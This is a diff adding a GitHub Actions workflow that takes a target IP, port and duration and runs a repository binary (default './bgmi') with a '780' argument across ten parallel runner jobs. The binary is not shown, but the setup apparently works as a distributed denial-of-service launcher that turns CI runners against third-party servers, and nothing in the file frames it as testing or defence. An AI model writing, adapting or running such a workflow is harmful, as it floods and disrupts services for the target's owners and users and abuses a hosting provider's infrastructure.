@@ -1,0 +1,81 @@
+name: Run Binary Parallel
+
+on:
+  workflow_dispatch:
+    inputs:
+      ip:
+        description: "Target IP or hostname"
+        required: true
+      port:
+        description: "Port number"
+        required: true
+        default: "80"
+      duration:
+        description: "Time in seconds"
+        required: true
+        default: "60"
+      zip_path:
+        description: "Path to a .zip in the repo that contains the binary (optional)"
+        required: false
+        default: ""
+      bin_path:
+        description: "Path to the binary if not using zip (e.g., ./bgmi)"
+        required: false
+        default: "./bgmi"
+
+jobs:
+  run-binary:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        thread_id: [1,2,3,4,5,6,7,8,9,10]   # 10 parallel executions
+
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v4
+
+      - name: Install unzip (if needed)
+        if: ${{ inputs.zip_path != '' }}
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y unzip
+
+      - name: Extract ZIP (if provided)
+        if: ${{ inputs.zip_path != '' }}
+        run: |
+          mkdir -p extracted
+          unzip -o "${{ inputs.zip_path }}" -d extracted
+
+      - name: Resolve binary path
+        id: bin
+        shell: bash
+        run: |
+          set -euo pipefail
+          if [[ -n "${{ inputs.zip_path }}" ]]; then
+            BIN="$(find extracted -type f -maxdepth 2 | head -n1)"
+          else
+            BIN="${{ inputs.bin_path }}"
+          fi
+          if [[ ! -f "$BIN" ]]; then
+            echo "Binary not found at: $BIN" >&2
+            exit 1
+          fi
+          echo "path=$BIN" >> "$GITHUB_OUTPUT"
+
+      - name: Make executable
+        run: chmod +x "${{ steps.bin.outputs.path }}"
+
+      - name: Run the binary (job ${{ matrix.thread_id }})
+        env:
+          IP: ${{ inputs.ip }}
+          PORT: ${{ inputs.port }}
+          DURATION: ${{ inputs.duration }}
+        run: |
+          echo "Job ${{ matrix.thread_id }} running: ${{ steps.bin.outputs.path }} $IP $PORT $DURATION 780"
+          "${{ steps.bin.outputs.path }}" "$IP" "$PORT" "$DURATION" "780" | tee "run-output-${{ matrix.thread_id }}.log"
+
+      - name: Upload logs
+        uses: actions/upload-artifact@v4
+        with:
+          name: run-output-${{ matrix.thread_id }}
+          path: run-output-${{ matrix.thread_id }}.log
